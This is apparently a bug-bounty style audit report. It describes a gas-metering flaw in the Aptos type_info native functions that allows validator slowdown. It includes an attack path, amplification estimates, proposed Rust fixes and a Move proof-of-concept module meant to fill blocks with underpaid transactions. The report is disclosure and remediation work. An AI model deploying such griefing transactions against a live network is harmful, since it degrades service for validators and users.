# Audit Report

## Title
Gas Metering Bypass in type_info Native Functions Allows Validator DoS Through Computation Amplification

## Summary
The `native_type_of` and `native_type_name` functions in `type_info.rs` charge gas for string formatting AFTER performing expensive computation, allowing attackers to cause validators to perform ~37x more work than they pay for by deliberately running out of gas before the per-byte charge. This enables a validator slowdown attack by filling blocks with underpaid computationally expensive transactions.

## Finding Description

The vulnerability exists in how gas is charged for type introspection operations. Both `native_type_of` and `native_type_name` follow this flawed execution pattern: [1](#0-0) [2](#0-1) 

The critical flaw is at lines 55-64 (type_of) and 92-98 (type_name): base gas is charged first, then expensive operations (`type_to_type_tag()` and `to_canonical_string()`) are performed, and only AFTER this work is the per-byte gas charged based on the resulting string length.

The developers acknowledged this issue in comments: [3](#0-2) [4](#0-3) 

While pseudo-gas limits prevent extremely complex types, they still allow types that generate long canonical strings. The pseudo-gas configuration is: [5](#0-4) 

An attacker can construct a type with 7-8 nested structs having maximum-length identifiers (255 bytes for module and name per the deserializer config). Each struct costs approximately 642 pseudo-gas (100 base + 542 bytes), fitting within the 5000 limit. The canonical string for such a type is approximately 4072 characters.

**Attack Path:**
1. Attacker crafts a transaction with minimal gas limit (e.g., 2000 gas to cover intrinsic costs)
2. Transaction calls `type_name<ComplexNestedStruct>()` where ComplexNestedStruct has 7 deeply nested structs with 255-character identifiers
3. Execution flow:
   - Charges TYPE_INFO_TYPE_NAME_BASE (1102 gas) - transaction has ~898 gas remaining
   - Calls `type_to_type_tag()` - completes successfully (within pseudo-gas limits)
   - Calls `to_canonical_string()` - generates ~4072 character string
   - Attempts to charge `18 * 4072 = 73,296` gas
   - **OUT_OF_GAS** - transaction aborts
4. Result: Validator performed work worth ~74,398 gas but attacker only paid 2000 gas

**Amplification Factor:** 74,398 / 2000 â‰ˆ 37x

By filling a block with such transactions, an attacker causes validators to perform 37x more computation than the gas limit would suggest, violating the fundamental invariant that gas costs must be proportional to computational work.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program category "Validator node slowdowns."

**Quantified Impact:**
- **Per Transaction:** Validators perform ~74,000 gas units of work while attacker pays ~2,000 gas (37x amplification)
- **Per Block:** With a 100M gas block limit, an attacker can include 50,000 such transactions, causing validators to perform ~3.7 billion gas units of computation (37x block processing time)
- **Network Effect:** All validators must process these blocks, creating network-wide slowdown
- **Attack Cost:** Minimal - attacker pays normal transaction fees for minimal gas

The attack directly breaks **Invariant #9: "All operations must respect gas, storage, and computational limits"** by allowing computation that far exceeds paid gas costs.

## Likelihood Explanation

**Likelihood: HIGH**

This vulnerability is highly likely to be exploited because:

1. **No Special Access Required:** Any user can submit transactions with arbitrary gas limits (within chain maximums) and type arguments
2. **Simple Exploitation:** Attack requires only crafting nested struct types with long names - no complex timing, race conditions, or state manipulation needed
3. **Repeatable:** Can be executed continuously to sustain validator slowdown
4. **Economically Viable:** Low cost (minimal gas per transaction) for high impact (37x computation amplification)
5. **No Detection Barrier:** Transactions appear as legitimate type introspection calls and will be included in blocks normally

The only complexity is determining the optimal type structure to maximize string length within pseudo-gas limits, which is straightforward through experimentation.

## Recommendation

**Immediate Fix:** Implement speculative gas charging with rollback on failure, or restructure to charge conservatively upfront.

**Option 1 - Conservative Pre-charging:**
```rust
fn native_type_name(
    context: &mut SafeNativeContext,
    ty_args: &[Type],
    arguments: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    debug_assert!(ty_args.len() == 1);
    debug_assert!(arguments.is_empty());

    context.charge(TYPE_INFO_TYPE_NAME_BASE)?;
    
    // Pre-charge for maximum possible string length based on pseudo-gas limits
    // Maximum ~50 type nodes * ~580 chars per struct = ~29,000 chars max
    let max_string_bytes = NumBytes::new(30000);
    context.charge(TYPE_INFO_TYPE_NAME_PER_BYTE_IN_STR * max_string_bytes)?;

    let type_tag = context.type_to_type_tag(&ty_args[0])?;
    let type_name = type_tag.to_canonical_string();
    
    // Refund excess gas
    let actual_bytes = NumBytes::new(type_name.len() as u64);
    let excess = TYPE_INFO_TYPE_NAME_PER_BYTE_IN_STR * (max_string_bytes - actual_bytes);
    context.refund(excess)?;

    Ok(smallvec![Value::struct_(Struct::pack(vec![
        Value::vector_u8(type_name.as_bytes().to_vec())
    ]))])
}
```

**Option 2 - Tighten Pseudo-Gas Limits:**
Reduce `type_max_cost` from 5000 to 1000 to limit maximum string length to manageable sizes where pre-computed gas charging is feasible. [6](#0-5) 

**Option 3 - Charge During Construction:**
Modify the type tag converter to charge actual transaction gas during type tag construction instead of using separate pseudo-gas metering.

## Proof of Concept

```move
module attacker::gas_grief {
    use std::string;
    use aptos_std::type_info;
    
    // Define deeply nested structs with maximum-length names (255 chars)
    // Using shorter names here for readability, but attack uses 255-char names
    struct VeryLongStructName1<T> { dummy: T }
    struct VeryLongStructName2<T> { dummy: T }
    struct VeryLongStructName3<T> { dummy: T }
    struct VeryLongStructName4<T> { dummy: T }
    struct VeryLongStructName5<T> { dummy: T }
    struct VeryLongStructName6<T> { dummy: T }
    struct VeryLongStructName7<T> { dummy: T }
    
    // Complex nested type that generates long canonical string
    // In real attack, all struct names would be 255 chars
    struct AttackType has drop {
        data: VeryLongStructName1<
            VeryLongStructName2<
                VeryLongStructName3<
                    VeryLongStructName4<
                        VeryLongStructName5<
                            VeryLongStructName6<
                                VeryLongStructName7<u8>
                            >
                        >
                    >
                >
            >
        >
    }
    
    // Entry function to execute attack
    // Set max_gas to minimum value (e.g., 2000) when calling this
    public entry fun grief_validators() {
        // This call will:
        // 1. Charge 1102 base gas
        // 2. Perform expensive type_to_type_tag conversion
        // 3. Generate long canonical string (~4000+ chars with real 255-char names)
        // 4. Try to charge 18 * 4000 = 72,000 gas
        // 5. Run out of gas if transaction has only ~2000 gas
        // Result: Validator did ~73,000 gas work but attacker paid ~2000
        let _ = type_info::type_name<AttackType>();
    }
}
```

**Attack Execution:**
1. Deploy module with structs having 255-character identifiers (maximum allowed)
2. Submit transaction calling `grief_validators()` with `max_gas_amount = 2000`
3. Transaction aborts with OUT_OF_GAS after validators perform expensive string formatting
4. Repeat to fill blocks, causing 37x computation amplification network-wide

### Citations

**File:** aptos-move/framework/src/natives/type_info.rs (L47-74)
```rust
fn native_type_of(
    context: &mut SafeNativeContext,
    ty_args: &[Type],
    arguments: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    debug_assert!(ty_args.len() == 1);
    debug_assert!(arguments.is_empty());

    context.charge(TYPE_INFO_TYPE_OF_BASE)?;

    let type_tag = context.type_to_type_tag(&ty_args[0])?;

    if context.eval_gas(TYPE_INFO_TYPE_OF_PER_BYTE_IN_STR) > 0.into() {
        let type_tag_str = type_tag.to_canonical_string();
        // Ideally, we would charge *before* the `type_to_type_tag()` and `type_tag.to_string()` calls above.
        // But there are other limits in place that prevent this native from being called with too much work.
        context
            .charge(TYPE_INFO_TYPE_OF_PER_BYTE_IN_STR * NumBytes::new(type_tag_str.len() as u64))?;
    }

    if let TypeTag::Struct(struct_tag) = type_tag {
        Ok(type_of_internal(&struct_tag).expect("type_of should never fail."))
    } else {
        Err(SafeNativeError::Abort {
            abort_code: super::status::NFE_EXPECTED_STRUCT_TYPE_TAG,
        })
    }
}
```

**File:** aptos-move/framework/src/natives/type_info.rs (L84-103)
```rust
fn native_type_name(
    context: &mut SafeNativeContext,
    ty_args: &[Type],
    arguments: VecDeque<Value>,
) -> SafeNativeResult<SmallVec<[Value; 1]>> {
    debug_assert!(ty_args.len() == 1);
    debug_assert!(arguments.is_empty());

    context.charge(TYPE_INFO_TYPE_NAME_BASE)?;

    let type_tag = context.type_to_type_tag(&ty_args[0])?;
    let type_name = type_tag.to_canonical_string();

    // TODO: Ideally, we would charge *before* the `type_to_type_tag()` and `type_tag.to_string()` calls above.
    context.charge(TYPE_INFO_TYPE_NAME_PER_BYTE_IN_STR * NumBytes::new(type_name.len() as u64))?;

    Ok(smallvec![Value::struct_(Struct::pack(vec![
        Value::vector_u8(type_name.as_bytes().to_vec())
    ]))])
}
```

**File:** aptos-move/aptos-vm-environment/src/prod_configs.rs (L246-249)
```rust
        // 5000 limits type tag total size < 5000 bytes and < 50 nodes.
        type_max_cost: 5000,
        type_base_cost: 100,
        type_byte_cost: 1,
```
